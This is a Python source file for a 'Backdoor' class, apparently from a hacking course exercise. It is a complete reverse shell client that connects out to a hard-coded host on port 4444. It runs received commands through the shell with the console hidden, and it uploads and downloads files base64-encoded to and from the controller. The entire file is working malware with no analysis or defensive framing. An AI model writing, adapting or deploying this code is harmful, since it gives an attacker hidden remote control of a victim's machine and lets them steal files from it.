#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64 as b64
import sys

class Backdoor:
    def __init__(self,ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connection.connect(("10.0.2.4", 4444))
        self.connection.connect((ip, port))

    def send_json(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def receive_json(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    #download files
    def read_file(self, path):
        with open(path,"rb") as file:
            return b64.b64encode(file.read())

    #upload files
    def write_file(self, path, content):
        with open(path,'wb') as file:
            file.write(b64.b64decode(content))
            return "[+] Upload successful. . ."

    def execute_sys_command(self, command):
        # try:
        #     return subprocess.check_output(command, shell=True)
        # except subprocess.CalledProcessError:
        #     return "error during command execution"
        return subprocess.check_output(command, shell=True, 
                                stderr= subprocess.DEVNULL, #to run without console
                                stdin= subprocess.DEVNULL) #to run without console

    def run(self):
        while True:
            # command = self.connection.recv(2048).decode()
            command = self.receive_json()
            
            try:
                #exit program
                if(command[0].lower() == "exit"):
                    self.connection.close()
                    sys.exit()

                #change directory
                elif(command[0] == "cd" and (len(command) > 1) ):
            
                    if(len(command) > 2): #in case directory has spaces in it
                        directory = ""
                        for i in range(1, len(command) ):
                            directory = directory + " " + command[i]
                        print("directory: ", directory)
                        command_result = self.change_directory(directory)
                    else:
                        command_result = self.change_directory(command[1])
                
                #download file
                elif(command[0].lower() == "download"):
                    command_result = self.read_file(command[1]).decode()

                #upload file
                elif(command[0].lower() == "upload"):
                    command_result = self.write_file(command[1], command[2] )

                else:
                    command_result = self.execute_sys_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution. "
            
            #send data
            try:
                self.send_json(command_result)
            except Exception:
                self.send_json("Error sending data through JSON")

        self.connection.close()

my_Backdoor = Backdoor("10.0.2.4", 4444)
my_Backdoor.run()
